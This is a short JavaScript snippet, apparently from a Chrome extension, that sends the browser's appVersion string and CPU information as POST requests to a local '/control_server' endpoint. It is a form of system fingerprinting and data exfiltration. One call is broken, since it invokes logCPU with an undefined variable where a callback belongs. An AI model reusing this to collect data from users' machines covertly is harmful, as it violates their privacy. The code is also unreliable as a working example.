
//OS System
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( window.navigator.appVersion),
        headers:{"Content-Type": "application/json"}
        }
)

//CPU INFO
function logCPU(C){
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( C),
        headers:{"Content-Type": "application/json"}
        }
)
}

chrome.system.cpu.getInfo(logCPU(info))


//Display INFO (for no particular reason)
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( window.navigator.appVersion),
        headers:{"Content-Type": "application/json"}
        }
)